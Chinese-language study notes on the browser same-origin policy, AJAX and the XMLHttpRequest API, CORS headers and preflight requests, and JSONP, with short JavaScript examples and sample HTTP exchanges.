◆相关规范与技术   
'Same-Origin Policy'同源政策 
  PS: 浏览器安全的基石,于1995年Netscape引入,目前所有浏览器都实行该政策;
    '同源'指的是: '协议'、'域名'、'端口'均相同 
    目的: 为保证用户信息的安全,防止恶意的网站窃取数据;
    提交表单不受同源政策的限制;
    script标签里的src属性里的路径不受同源策略的限制
  限制 
    脚本运行时会进行同源检查,只有同源的脚本才能被执行
    同源政策规定,AJAX请求只能发给同源的网址,否则就报错 
    目前,若非同源,有三种行为受到限制:
    1、Cookie、LocalStorage 和 IndexedDB 无法读取 
    2、DOM 无法获得 
    3、AJAX 请求不能发送 
    虽然这些限制是必要的,但是有时很不方便,合理的用途也受到影响.
  服务器代理跨域 : 从服务器后端访问其他域进行中间代理
'Asynchronous JavaScript and XML'AJAX,浏览器提供的使用HTTP协议收发数据的接口 
  PS: 'file://'协议无法使用AJAX,只有'http'和'https'协议才可以使用AJAX; 
    提供了与服务器异步通信的能力; W3C在2006年发布了AJAX的国际标准 
    使用JS来操作'XMLHttpRequest'对象接口和服务器进行异步通信 
  使用步骤: 
    建立连接[设置请求行]-设置请求头-设定响应事件-发送请求体 
  AJAX缺点 
    不支持使用后退功能,对搜索引擎的支持比较弱
    ◆Level1 的限制
    受浏览器'同源策略'限制,只能请求同域资源[否则请求被拒绝,而未发出];
    仅支持文本数据传输,无法读取和上传二进制文件数据;
    传输数据时,没有进度信息提示, 只能提示是否完成;
    没有超时机制,不方便掌控ajax请求节奏;
XMLHttpRequest,AJAX实现的核心 
  PS: IE5最先引入该对象,通过MSXML库中的一个ActiveX对象实现 
    请求发送到服务器端,在收到响应后,响应的数据会自动填充xhr对象的属性,
    即调用xhr的属性可以得到响应的信息;
    XMLHttpRequest2级规范IE10+支持,level2兼容level1 
  Extend: XMLHttpRequestEventTarget 
    console.log(XMLHttpRequest.prototype.__proto__.constructor===XMLHttpRequestEventTarget);
  Instance:
    xhr = new XMLHttpRequest()  创建xhr对象 
  Proto: 
    .open(method,url[,bol])  // 建立请求,以备后续数据发送 
      PS: 若对使用过open()方法的请求,再次使用该方法,等同于调用.abort() 
      method  发送请求的类型,如GET、POST等 
      url     请求的地址 
        可使用相对地址或绝对地址 
        查询了字符串需 encodeURIComponent() 进行编码 
      bol     可选,是否异步,默认:true 
      userName    str,可选,用户名,默认空字符串
      passWord    str,可选,密码,默认空字符串
    .setRequestHeader(key,val) // 设定请求头 
      PS: 'open'后'send'前使用; 
        若多次设置同一字段,则最终发送每次设置值的合并值  
      'Content-Type'   发送的数据格式,编码类型  
        PS: 请求头中Content-Type决定POST发送数据的编码类型[GET没有请求体],
          不同的值对应不同的提交和回调处理方式;
          有常见的五种'Content-Type'发送数据的方式; 
        'text/plain' 默认值 
          若未设定且数据不是 FormData 和 XML Document,则默认为'text/plain';
        'application/json' JSON格式的数据
          使用该MIME类型时,需要将数据对象转换成JSON串,
          再设定请求头部的Content-Type,就可以发数据了
          xhr.setRequestHeader('Content-Type', 'application/json');
        'application/x-www-form-urlencoded' 
          要求数据按照key1=value1&key2=value2的格式发送,
          且其中的特殊字符需要转义成%HH的形式;
        'multipart/form-data' 多用来提交文件 
          采用HTML5的FormData对象来构建提交的数据;
          不设置请求头部的Content-Type,交给浏览器来处理[设定Boundary等工作];
        'text/xml' XML格式传输 
          首先,构建XML文档对象,存入表单数据
          /* data参数为表单数据组成的对象,dataToSend为待发送给后端的数据 */
          var dataToSend = document.implementation.createDocument("", "formdata", null);
          var tempData = dataToSend.documentElement;
          for (var key in data) {
            if (data.hasOwnProperty(key)) {
              var keyElement = doc.createElement(key);
              keyElement.appendChild(doc.createTextNode(data[key]));
              tempData.appendChild(keyElement);
            }
          }
          /*
          xml文档格式示意:
          <formdata>
          <key1> value1 </key1>
          <key2> value2 </key2>
          </formdata>
          */
          发送数据[不需设置Content-Type]
          req.send(dataToSend);
      'Content-Length' 发送的数据长度
        num  
          xhr.setRequestHeader('Content-Length', JSON.stringify(data).length);
    .withCredentials  // bol,读写,是否允许跨域获取用户信息,默认:false[IE10+] 
      PS: 用户信息,比如Cookie和认证的HTTP头信息,
      为让该属性生效,服务器必须显式返回'Access-Control-Allow-Credentials'头信息 
      Access-Control-Allow-Credentials: true 
        发送Cookie,且会设置服务器指定的Cookie 
    .responseType // str,指定响应体类型 
      ''            默认值,字符串
      'text'        字符串,适合大多数情况
      'json'        JSON对象
        若将这个属性设为“json”,支持JSON的浏览器(Firefox>9,chrome>30),
        就会自动对返回数据调用JSON.parse()方法.
        也就是说,从xhr.response 属性得到的不是文本,而是一个JSON对象.
      'blob'        Blob对象,适合读取二进制数据,比如图片文件等
      'arraybuffer' ArrayBuffer对象
      'document'    Document对象,适合返回XML文档的情况
        XHR2支持Ajax的返回类型为文档,即xhr.responseType=”document” .
        这意味着,对于那些打开CORS的网站,我们可以直接用Ajax抓取网页,
        然后不用解析HTML字符串,直接对XHR回应进行DOM操作.
      Example:
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/path/to/image.png', true);
        xhr.responseType = 'blob';
        xhr.onload = function(e) {
          if(this.status == 200) {
            var blob = new Blob([this.response], {type: 'image/png'});
            // 或者
            var blob = oReq.response;
          }
        };
      xhr.send();
    .timeout     // num,超时设定,单位ms[DiBs][level2]
      PS: 指定时间内未收到响应,就会自动终止,并触发xhr的 ontimeout 事件 
        IE8+该属性属于 XDomainRequest 对象,IE10 支持该属性
        而 Chrome 和 Safari 还不支持
      0,   表示没有时间限制 
    .overrideMimeType(kw) // 重写响应体MIMEtype[IE不支持][level2] 
      PS: send前调用;Firefox最早引入,现已纳入XMLHttpRequest2级规范; 
      'text/xml'          预设为xml 
        可用responseXML
      'application/json'  预设为json 
        需先JSON解析,JSON.parse(responseText);
      ...
      Example:  
      var xhr = new XMLHttpRequest();
      xhr.open("get","URL",true);
      xhr.overrideMimeType("text/XML");
      xhr.send(null);
      强制使xhr对象将响应当作XML而非纯文本来处理
    .send([data])     // 发送请求数据 
      data 发送的数据
        类型可为obj,str,'FormData''ArrayBufferView''Blob''Document'等 
        若为空,表示HTTP请求只包含头信息,而无请求体,如GET请求 
          可写作 xhr.send(null) 或 xhr.send()
        不为空,表示除了头信息,也包含请求体,如POST请求 
      Example: 
        发送二进制数据,最好使用ArrayBufferView或Blob对象,这使得通过Ajax上传文件成为可能 
          function sendArrayBuffer() {
            var xhr = new XMLHttpRequest();
            var uInt8Array = new Uint8Array([1, 2, 3]);
            xhr.open('POST', '/server', true);
            xhr.onload = function(e) { ... };
            xhr.send(uInt8Array.buffer);
          }
        FormData类型可以用于构造表单数据 
          var formData = new FormData();
          formData.append('username', '张三');
          formData.append('email', 'zhangsan@example.com');
          formData.append('birthDate', 1940);
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "/register");
          xhr.send(formData);
          效果与点击下面表单的submit按钮一样
          <form id='registration' name='registration' action='/register'>
            <input type='text' name='username' value='张三'>
            <input type='email' name='email' value='zhangsan@example.com'>
            <input type='number' name='birthDate' value='1940'>
            <input type='submit' onclick='return sendForm(this.form);'>
          </form>
    .sendAsBinary(BinaryString) // 发送二进制字符串[Chrome中移除] 
      自行实现如下 
      XMLHttpRequest.prototype.sendAsBinary = function(text){
        var data = new ArrayBuffer(text.length);
        var ui8a = new Uint8Array(data, 0);
        for (var i = 0; i < text.length; i++){ 
          ui8a[i] = (text.charCodeAt(i) & 0xff);
        }
        this.send(ui8a);
      }
      每个头信息之间使用CRLF分隔,若没有收到服务器回应,该属性返回null.
    .response     // obj/str,响应体 
      PS: 其类型可为str、ArrayBuffer、Blob、Document、JSON 
        由 responseType 属性的值决定 
        若请求没有成功或者数据不完整,该属性就会等于 null
    .responseText // str,响应体文本 
      PS:若本次请求没有成功或者数据不完整,该属性就会等于null.
        若服务器返回的数据格式是JSON,则该属性为JSON字符串.
    .responseStream  // 服务器返回的数据流
    .responseXML  // str,只读,获取XML形式的响应体或null  
      若响应体类型为'text/xml'或'application/xml',
      则获取到XML DOM文档,否则为 null 
    .responseURL  
    .status      // num,只读,响应HTTP状态码 
      200, 访问正常
      301, 永久移动
      302, 暂时移动
      304, 未修改
      307, 暂时重定向
      401, 未授权
      403, 禁止访问
      404, 未发现指定网址
      500, 服务器发生错误
      ...
    .statusText  // str,只读,响应状态的文本描述,如'OK' 
    .getResponseHeader(key)  // str,获取指定响应头信息 
      Example:
      xhr.getResponseHeader('Content-Type');
    .getAllResponseHeader()  // str,获取所有响应头信息  
    .abort()    // 终止连接 
      调用该方法后,xhr对象会停止触发事件 
      且不再允许访问任何与响应有关的对象属性
      在终止请求后,还应该对xhr对象进行解引用操作.
      若请求已经被发送,则立刻中止请求.
    .onreadystatechange  // xhr.readyState 值改变时触发事件 
      Example: 
      xhr.onreadystatechange = function(){
        if(xhr.readyState ===4 && xhr.status === 200) {
          // 
        }
      };
    .readyState  // num,只读,AJAX请求状态码 
      PS: 在通信过程中,每当发生状态变化的时候,readyState属性的值就会发生改变
      0   未初始化  还未调用 xhr.open() 
      1   启动      已调用 xhr.open(),但未发送数据 
      2   发送      浏览器接收到响应头
      3   接收      浏览器接收到响应体 
      4   完成      浏览器已接收到全部响应数据,或本次接收已失败 
      Remarks:
        xhr.onreadystatechange =function(e){}, 此时 e.target 即为 xhr
    .upload 
    .upload.onprogress = function(e){ // 上传进度事件,触发频率50ms/次[level2]  
      PS: 文件太小网络环境好的时候是直接到100%的;
        在xhr.send()后,xhr.readystate=2 前触发;
      e.lengthComputable   bol,能否获取到上传数据的大小   
      e.loaded             已上传数据的大小 
      e.total              上传数据的大小 
      Example:显示上传进度
        <progress min="0" max="100" value="0">0% complete</progress>
        function upload(blobOrFile) {
          var xhr = new XMLHttpRequest();
          xhr.open('POST', '/server', true);
          xhr.onload = function(e) { ... };
          // Listen to the upload progress.
          var progressBar = document.querySelector('progress');
          xhr.upload.onprogress = function(e) {
            if(e.lengthComputable) {
              progressBar.value = (e.loaded / e.total) * 100;
              // Fallback for unsupported browsers.
              progressBar.textContent = progressBar.value;
            }
          };
          xhr.send(blobOrFile);
        }
        upload(new Blob(['hello world'], {type: 'text/plain'}));
    }  
    ◆其他 
      接收二进制数据 
        PS:老版本的XMLHttpRequest对象,只能从服务器取回文本数据,新版则可以取回二进制数据.
        改写 MIMEType [老方法]
          改写数据的MIMEType,将服务器返回的二进制数据伪装成文本数据.
          xhr.overrideMimeType ("text/plain; charset=x-user-defined");
          然后,用 responseText 属性接收服务器返回的二进制数据.
          var binStr = xhr.responseText;
          由于这时,浏览器把它当做文本数据,所以还必须再一个个字节地还原成二进制数据.
          for (var i = 0, len = binStr.length; i < len; ++i) {
            var c = binStr.charCodeAt (i);
            var byte = c & 0xff;
          }
          最后一行的位运算"c & 0xff",表示在每个字符的两个字节之中,只保留后一个字节,将前一个字节扔掉.
          原因是浏览器解读字符的时候,会把字符自动解读成Unicode的 0xF700-0xF7ff 区段.
        responseType 属性 [新方法]
          PS:从服务器取回二进制数据,较新的方法是使用新增的 responseType 属性.
            若服务器返回文本数据,这个属性的值是"TEXT",这是默认值.
            较新的浏览器还支持其他值,也就是说,可以接收其他格式的数据.
            把 responseType 设为 blob,表示服务器传回的是二进制对象.
          Example:
            var xhr = new XMLHttpRequest ();
            xhr.open ('GET', '/path/to/image.png');
            xhr.responseType = 'blob';
            接收数据的时候,用浏览器自带的 Blob 对象即可.
            var blob = new Blob ([xhr.response], {type: 'image/png'});
            注意,是读取 xhr.response,而不是 xhr.responseText.
            你还可以将 responseType 设为 arraybuffer,把二进制数据装在一个数组里.
            var xhr = new XMLHttpRequest ();
            xhr.open ('GET', '/path/to/image.png');
            xhr.responseType = "arraybuffer";
            接收数据的时候,需要遍历这个数组.
            var arrayBuffer = xhr.response;
            if (arrayBuffer) {
              var byteArray = new Uint8Array (arrayBuffer);
              for (var i = 0; i < byteArray.byteLength; i++) {
                // do something
              }
            }
      Example:
        使用FormData接口上传文件
          <form id="file-form" action="handler.php" method="POST">
            <input type="file" id="file-select" name="photos[]" multiple/>
            <button type="submit" id="upload-button">上传</button>
          </form>
          var fileSelect = document.getElementById('file-select');
          var files = fileSelect.files;
          var formData = new FormData();
          for(var i = 0; i < files.length; i++) {
            var file = files[i];
            if(!file.type.match('image.*')) { continue; }
            formData.append('photos[]', file, file.name);
          }
          var xhr = new XMLHttpRequest();
          xhr.open('POST', 'handler.php', true);
          xhr.onload = function() {
            if(xhr.status !== 200) { alert('An error occurred!'); }
          };
          xhr.send(formData);
        使用File API上传文件
          var file = document.getElementById('test-input').files[0];
          var xhr = new XMLHttpRequest();
          xhr.open('POST', 'myserver/uploads');
          xhr.setRequestHeader('Content-Type', file.type);
          xhr.send(file);
    常量: 
      .UNSENT  0  
      .OPENED  1  
      .HEADERS_RECEIVED  2  
      .LOADING 3  
      .DONE    4  
  Expand: 
  Example: 
    使用范例
      var xhr = new XMLHttpRequest(); // 创建 Ajax 对象
      xhr.open(method, url, async); // 设置请求方法 请求地址 是否异步
      xhr.onreadystatechange = function() { // 注册响应函数
        console.log('state change', xhr);
      }
      xhr.send(); // 发送请求

      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/login', true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.onreadystatechange = function() {
        if(xhr.readyState === 4) {
          console.log('state change', xhr, xhr.status, xhr.response);
          var response = JSON.parse(xhr.response);
          console.log('response', response);
        } 
        else {
          console.log('change');
        }
      }
      var account = { username: 'gua', password: '123', };
      var data = JSON.stringify(account);
      xhr.send(data); // 发送请求

      // 可以封装成这样的一个函数
      var ajaxSelf = function(method,path,bool,headers,data,reseponseCallback) {
        var xhr =new XMLHttpRequest();
        xhr.open(method,path,bool);
        if(method == "POST") {
          xhr.onreadystatechange =function(){
            if(xhr.readyState == 4) {
              reseponseCallback(xhr.response);
            }else {
              console.log(xhr.readyState);
            }
          };
          xhr.setRequestHeader("Content-Type",headers);
          var da =JSON.stringify(data);
          xhr.send(da);
        }
        else {
          xhr.onreadystatechange =function(){
            if(xhr.readyState == 4) {
              reseponseCallback(xhr.response);
            }else {
              console.log(xhr.readyState);
            }
          };
          xhr.send(null);
        }
      }
      var url = 'https://vip.cocode.cc/uploads/pins.json';
      var callback =function(a){ console.log(a); };
      ajaxSelf("GET",url,true,"application/json",null,callback);
    从后台获取数据
      在 vip.cocode.cc 域名下运行
      // 定义函数ajaxGet 获取url的信息,并执行回调函数 callback
      var ajaxGet = function(url, callback) {
          var xhr = new XMLHttpRequest()
          xhr.open('GET', url, true)
          xhr.onreadystatechange = function(event) {
              if(xhr.readyState === 4) {
                  callback(xhr.response)
              }
          }
          xhr.send()
      }
      // 具体的需要获取的数据的url
      var url = 'http://vip.cocode.cc/uploads/pins.json'

      // 具体的执行callback函数fu
      // 在控制台输出经过JSON解析的信息
      function fu(data) {
          var info = JSON.parse(data)
          console.log("1",info)
      }
      // 执行函数 输出信息
      ajaxGet(url, fu)

      // 具体的执行callback函数 addImg
      // 在页面中添加图片
      function addImg(data){
        var obj =JSON.parse(data)
        var htmlcode =''
        for(var i = 0; i < obj.pins.length; i++) {
          var key = obj.pins[i].file.key  //由提供数据的格式决定
          var url = 'http://img.hb.aicdn.com/' + key  // 访问 url 就会得到一张照片
          htmlcode =htmlcode + `<img src=${url}>`
        }
        var body = document.querySelector('body')
        body.insertAdjacentHTML('beforeend', htmlcode)
      }
      // 执行函数 添加图片到页面中
      ajaxGet(url, addImg)
    使用 ajax 和后端交互数据
      在 vip.cocode.cc:3000/ 写代码
      试一下
        // 按照要求来定义 创建AJAX函数
        // 使用get来获得响应
        var ajaxGet =function(arg){
         var xhr =new XMLHttpRequest();
         xhr.open('GET',arg.url,true);
         xhr.onreadystatechange =function(){
           if(xhr.readyState === 4) {
             arg.callback(xhr.response);
           }
         }
         xhr.send();
        }
        // 使用POST来发送信息并获取响应
        var ajax =function(arg){
         var xhr =new XMLHttpRequest();
         xhr.open(arg.method,arg.url,true);
         xhr.setRequestHeader('Content-Type',arg.ContentType)
         xhr.onreadystatechange =arg.callback
         xhr.send(arg.data)
        }

        // 1, 获得所有的 数据info数组(返回的是一个数组)
          // GET
          // http://vip.cocode.cc:3000/todo/<你的qq号>/all
        var allTodos =function(){
          var request ={
            url:'http://vip.cocode.cc:3000/todo/123456789/all',
            callback:function(arg){
              console.log(arg);
            }
          }
          ajaxGet(request)
        }()
        // 返回响应信息:info数组

        // 2, 发送 JSON格式对象 添加元素到info中
          // 要求设置 Content-Type 为 application/json
          //   POST
          //   {"task": "study"}
          //   http://vip.cocode.cc:3000/todo/<你的qq号>/add
        var addTodo =function(){
          var request ={
            url:'http://vip.cocode.cc:3000/todo/123456789/add',
            method:'POST',
            ContentType:'application/json',
            data:JSON.stringify({"task": "study"}),
            callback:function(arg){
              console.log('add',arg);
            }
          }
          ajax(request);
        }()
        // {"task": "study"} 添加到数组中 ,返回响应信息:添加到info的元素

        // 3, 通过数组元素自身的id属性 发送 JSON格式对象 更改一个元素
          // 要求设置 Content-Type 为 application/json
          //   POST
          //   {"task": "study"}
          //   http://vip.cocode.cc:3000/todo/<你的qq号>/update/<todo_id>
        var updateTodo =function(){
          var request ={
            url:'http://vip.cocode.cc:3000/todo/123456789/update/500',
            method:'POST',
            ContentType:'application/json',
            data:'{"task":"abc"}',
            callback:function(a){
              console.log(a);
            }
          }
          ajax(request)
        }()
        // 将info的元素的id为500的元素 更改为 {"task":"abc"} 创建的info元素 返回响应信息:更改后的info元素

        // 4,  通过数组元素自身的id属性  删除一个元素
          //   GET
          //   http://vip.cocode.cc:3000/todo/<你的qq号>/delete/<todo_id>
        var deleteTodo =function(id){
          var request ={
            url:'http://vip.cocode.cc:3000/todo/123456789/delete/'+id,
            method:'GET',
            callback:function(a){
              console.log(a);
            }
          }
          ajaxGet(request)
        }()
          // 通过指定info元素的id来删除元素,返回响应信息:被删除的元素
      使用面向对象 封装
        var TodoApi = function(qqNumber="123456"){
          this.baseUrl ='http://vip.cocode.cc:3000/todo';
          this.qq =qqNumber;
        }

        TodoApi.prototype.get =function(path){
          var url =`${this.baseUrl}/${this.qq}`+path;
          var xhr =new XMLHttpRequest();
          xhr.open('GET',url,true);
          xhr.onreadystatechange =function(){
            if(xhr.readyState ==4) {
              console.log("1",xhr.response);
            }
          }
          xhr.send();
        }
        TodoApi.prototype.post =function(path,message){
          var url =`${this.baseUrl}/${this.qq}`+path;
          var xhr =new XMLHttpRequest();
          xhr.open('POST',url,true);
          xhr.setRequestHeader('Content-Type',"application/json")
          xhr.onreadystatechange =function(){
            if(xhr.readyState ==4) {
              console.log("1",xhr.response);
            }
          }
          var mess =JSON.stringify(message)
          xhr.send(mess);
        }

        TodoApi.prototype.all =function(){
          var path ='/all';
          this.get(path)
        }
        TodoApi.prototype.add =function(obj){
          var path ='/add';
          this.post(path,obj)
        }
        TodoApi.prototype.update =function(id,obj){
          var path ='/update/'+id;
          this.post(path,obj)
        }
        TodoApi.prototype.delete =function(id){
          var path ='/delete/'+id;
          this.get(path)
        }

        // 调用
        // 对象实例化
        var t =new TodoApi();
        // 返回info数组
        t.all()
        // 添加 元素到info中
        t.add({task:"abc"})
        // 通过id 修改info元素
        t.update('708',{task:'111'})
        // 通过id来删除info元素
        t.delete("709")
XMLHttpRequestEventTarget,AJAX请求相关的事件 
  Extend: EventTarget 
    console.log(XMLHttpRequestEventTarget.prototype.__proto__.constructor===EventTarget);
  Proto: 
    PS: 事件须在'send'方法调用前设定 
    .ontimeout   超时事件,当响应时间超过指定时间触发[level2]
    .onloadstart 在接收到响应数据的第一个字节时触发[level2] 
    .onprogress  下载进度事件,在接收响应期间持续触发[level2]
      PS: 下载的'progress'事件属于'xhr'对象,上传的'progress'事件属于'xhr.upload'对象
        需在open方法前添加progress事件处理程序
      Event事件对象及其属性/方法 
      e.lengthComputable bol,能否获取到下载数据的长度  
      e.position         表示已接收的字节数
      e.totalSize        表示根据Content-Length响应头部确定的预期字节数
      Example: 
        // 定义progress事件的回调函数
        xhr.onprogress = updateProgress;
        xhr.upload.onprogress = updateProgress;
        function updateProgress (event) {
          if (event.lengthComputable) {
            var percentComplete = event.loaded / event.total;
            // 若 event.lengthComputable 不为真,则 event.total 等于0.
            // event.total 需要传输的总字节
            // event.loaded 是已经传输的字节
          }
        }
    .onabort     请求被中止,如调用abort()方法 [level2]
    .onerror     请求失败[level2] 
      若发生网络错误(比如服务器无法连通),onerror事件无法获取报错信息,所以只能显示报错.
    .onload      接收到完整的响应数据时触发[level2]
      PS: 相当于jQuery中ajax的'success'
      Firefox中引入的load事件,用于代替readystatechange事件
      该事件的执行函数会接收到一个event对象,其target属性就指向xhr对象实例
    .onloadend   通信完成或触发error、abort或load事件后触发 [level2] 
      PS: 相当于jQuery AJAX的'completed'
'Cross-Origin Resource Sharing'CORS,跨源资源共享[IE10+] 
  PS: W3C标准,允许浏览器跨源发出XMLHttpRequest请求; 
    'XMLHttpRequest level2'可跨域发出HTTP请求;
    使用"跨域资源共享"的前提: 需浏览器支持该功能,且服务器需同意该"跨域", 
    整个CORS通信过程,都是浏览器自动完成,不需要用户参与 
    实现CORS通信的关键是服务器,只要服务器实现了CORS接口,就可跨源通信 
  '简单请求'&'非简单请求' ‹浏览器对待的方式不同› 
    'simple request': 
      'HEAD'、'GET'、'POST'请求,
      且头信息不超出以下字段的CROS请求  
        Accept
        Accept-Language
        Content-Language
        Content-Type ‹只限于三个值›  
          application/x-www-form-urlencoded 
          multipart/form-data 
          text/plain 
        DPR
        Downlink
        Save-Data
        Viewport-Width
        Width
      请求详情: 
        GET http://democode.likecto.hkbao.com/user,isLogin HTTP/1.1
        Host: democode.likecto.hkbao.com
        Proxy-Connection: keep-alive
        Pragma: no-cache
        Cache-Control: no-cache
        Accept: application/json, text/plain, '*/*'
        Origin: http://localhost:8080 
          浏览器直接发出CORS请求,在头信息中增加该字段 
        User-Agent: ... 
        Referer: http://localhost:8080/
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        
        HTTP/1.1 200 OK
        Date: Thu, 14 Dec 2017 10:58:18 GMT+0800
        Server: nginx/1.10.3
        Content-Type: text/html; charset=utf-8
        Access-Control-Allow-Credentials: true 
          是否允许发送Cookie
          前端须在AJAX请求中打开withCredentials属性 
            var xhr = new XMLHttpRequest();
            xhr.withCredentials = true;
            若省略withCredentials设置,有的浏览器还是会一起发送Cookie.这时,可以显式关闭withCredentials.
            xhr.withCredentials = false;
            这个值也只能设为true,若服务器不要浏览器发送Cookie,删除该字段即可.
          该项为true时,服务器不可设置 Access-Control-Allow-Origin: *,否则请求将会失败  ‹?›
        Access-Control-Allow-Headers: x-requested-with,content-type 
          CORS请求时,xhr.getResponseHeader()方法只能拿到6个基本字段:
            Cache-Control、
            Content-Language、
            Content-Type、
            Expires、
            Last-Modified、
            Pragma.
          若想拿到其他字段,就必须在Access-Control-Expose-Headers里面指定
        Access-Control-Allow-Methods: GET
        Access-Control-Allow-Origin: http://localhost:8080
          当浏览器发现响应头中无该头信息或不包括该请求域则报错,
          执行XMLHttpRequest的onerror回调 
          注意,这种错误无法通过状态码识别,因为HTTP回应的状态码有可能是200.
          表示允许请求的域,若为*,则允许所有请求 
    'not-so-simple request': 不满足'simple request'的CROS请求   
      浏览器会在正式通信之前,增加一次'preflight'预检请求   
        浏览器先询问服务器,是否允许该CROS请求,
        只有得到肯定答复,浏览器才会发出正式的XMLHttpRequest请求,否则报错 
      预检请求详情:  
        PS: 服务器收到'预检请求'后,检查'Origin'、'Access-Control-Request-Method'及
          'Access-Control-Request-Headers'等字段后,对是否允许跨源请求做出回应 
          若服务器未返回任何CORS相关的头信息字段,则浏览器认定不可跨域,
          XMLHttpRequest对象的onerror回调会执行 
        OPTIONS /cors HTTP/1.1 
          浏览器的'预检请求'使用OPTIONS方法  
        Host: api.alice.com 
        Origin: http://api.bob.com 
          请求来源  
        Access-Control-Request-Method: PUT 
          非简单请求使用的方法‹本例是PUT› 
        Access-Control-Request-Headers: X-Custom-Header 
          一个逗号分隔的字符串,指定浏览器CORS请求会额外发送的头信息字段 
          ‹本例是X-Custom-Header›
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,'*/*';q=0.8
        Accept-Encoding: gzip,deflate
        Accept-Language: en-US
        Connection: keep-alive
        User-Agent: Mozilla/5.0...
        
        HTTP/1.1 200 OK
        Date: Mon, 01 Dec 2008 01:15:39 GMT
        Server: Apache/2.0.61 (Unix)
        Access-Control-Allow-Origin: http://api.bob.com 
          允许访问的请求地址   
        Access-Control-Allow-Methods: GET, POST, PUT 
          逗号分隔的一个字符串,表明服务器支持的所有跨域请求的方法 
          返回的是所有支持的方法,而不单是浏览器请求的那个方法‹为了避免多次"预检请求"› 
        Access-Control-Allow-Headers: X-Custom-Header 
          一个逗号分隔的字符串,表明服务器允许的额外头信息字段 
          且不限于浏览器在预检中请求的字段.
          若浏览器请求包括Access-Control-Request-Headers字段,
          则Access-Control-Allow-Headers字段是必需的.
        Access-Control-Allow-Credentials: true 
          是否允许发送Cookie 
        Access-Control-Max-Age: 1728000 
          指定本次预检请求的有效期,单位:秒 
          该例中有效期是20天,即该条请求在此期间,不用发出另一条预检请求 
        Content-Type: text/html; charset=utf-8
        Content-Encoding: gzip
        Content-Length: 0
        Keep-Alive: timeout=2, max=100
        Connection: Keep-Alive
        Content-Type: text/plain
        Set-Cookie: ...
      通过了预检请求后的CROS请求: 
        PUT /cors HTTP/1.1
        Host: api.alice.com
        Origin: http://api.bob.com 
          Origin 字段,浏览器自动添加的 
        Content-Type: application/json;charset=UTF-8
        X-Custom-Header: value
        Accept-Language: en-US
        Connection: keep-alive
        User-Agent: Mozilla/5.0...
        
        HTTP/1.1 200 OK
        Date: Thu, 14 Dec 2017 11:24:01 GMT+0800
        Server: nginx/1.10.3
        Access-Control-Allow-Origin: http://api.bob.com 
          Access-Control-Allow-Origin字段是每次回应都必定包含的.
        Access-Control-Allow-Credentials: true
        Access-Control-Allow-Headers: x-requested-with,content-type
        Access-Control-Allow-Methods: GET
        Content-Type: text/html; charset=utf-8
        Set-Cookie: ... 
      PHP的设置 
        header("Access-Control-Allow-Origin:*"); 
        header("Access-Control-Allow-Headers:content-type"); 
        header("Access-Control-Request-Method:GET,POST"); 
        if(strtoupper($_SERVER['REQUEST_METHOD']) == 'OPTIONS'){ 
          exit; 
        } 
  与JSONP的比较
    JSONP只支持GET请求,CORS支持所有类型的HTTP请求.
    JSONP的优势在于支持老式浏览器,以及可以向不支持CORS的网站请求数据.      
  IE对CORS的实现: IE8中引入了'XDomainRequest'XDR类型,与XHR类似,但可实现跨域通信 
'JSON with Padding'JSONP,填充式JSON或参数式JSON 
  PS: 可用于决解主流浏览器的跨域数据访问,只能支持GET请求 
    应用JSON的一种新方法.
    一种使用<script>标记获取JSON对象的方法.
    决解AJAX不能跨域访问的问题.
  使用方法及原理: 
    script标签可载入外域的JS文件,自己先定义一函数,然后从script中载入执行函数,
    从而达到载入JS文件后就执行操作,达到获取数据,
    从而也省去了监听script加载完成的操作.
    Example:
      <script src="http://www.aoo.com/boo?callback=foo1"></script> 
      后端通过callback获取参数值'fool1'进行动态生成代码
      自定义一全局函数并执行 fool1(arg) 
    Example:
      在 a 网页中
      <script >
        function foo(data){ /*定义需执行的操作*/ }
      </script>
      访问 'https://www.baidu.com/xx,js' 网址可获取的内容
      foo({/*设置的内容*/});
      当 <script src="https://www.baidu.com/xx,js" charset="utf-8"></script> 载入后,
      就可获取所需要的数据,执行所需要的操作了.
    Remarks:
      可在url的后面添加参数用于定义双方函数名, (?)
      如 'https://www.baidu.com?foo='
  缺点
    可能存在安全隐患,须确保JSON数据中无恶意的代码
    若JSONP请求失败则不容易判断,虽然HTML5给<script>元素新增了一error事件,但支持情况不好
  Remarks: 
    <script>标记放在body标记结尾处,等待网页加载完后在载入
  决解向AJAX一样动态更新的问题
    通过替换script标签来动态更新
    不能通过只更换script的src标签来达到效果,浏览器不会将其看作一个新元素;
    更换script标签后,强制浏览器做出请求,这种技术称为"脚本插入"
  Example:
    JSONP方法跨域获取百度搜索建议词
    <script type="text/javascript">
      window.onload = function() {
        // 查询内容
        var content = "123";
        //组装查询地址
        var baiduUrl =
           "http://suggestion.baidu.com/su?wd=#content#&cb=window.baidu.sug";
        baiduUrl = baiduUrl.replace("#content#", content);

        //定义回调函数
        window.baidu = {
          sug: function(json) {
            console.log(json)
          }
        }

        //动态添加JS脚本
        var script = document.createElement("script");
        script.src = baiduUrl;
        script.id = 'oldUrl';
        document.getElementsByTagName("head")[0].appendChild(script);
      }
    </script>
  JSONP 服务器与客户端跨源通信的常用方法
    特点就是简单适用,老式浏览器全部支持,服务器改造非常小.
    它的基本思想是,网页通过添加一个<script>元素,向服务器请求JSON数据,
    这种做法不受同源政策限制；服务器收到请求后,将数据放在一个指定名字的回调函数里传回来.
    首先,网页动态插入<script>元素,由它向跨源网址发出请求.
    
    function addScriptTag(src) {
      var script = document.createElement('script');
      script.setAttribute("type","text/javascript");
      script.src = src;
      document.body.appendChild(script);
    }
    
    window.onload = function () {
      addScriptTag('http://example.com/ip?callback=foo');
    }
    
    function foo(data) {
      console.log('Your public IP address is: ' + data.ip);
    };
    上面代码通过动态添加<script>元素,向服务器example.com发出请求.注意,该请求的查询字符串有一个callback参数,用来指定回调函数的名字,这对于JSONP是必需的.
    
    服务器收到这个请求以后,会将数据放在回调函数的参数位置返回.
    foo({
      "ip": "8.8.8.8"
    });
    由于<script>元素请求的脚本,直接作为代码运行.这时,只要浏览器定义了foo函数,该函数就会立即调用.作为参数的JSON数据被视为JavaScript对象,而不是字符串,因此避免了使用JSON.parse的步骤.
'Img Ping'跨域,与服务器进行简单、单向的跨域通信的一种方式 
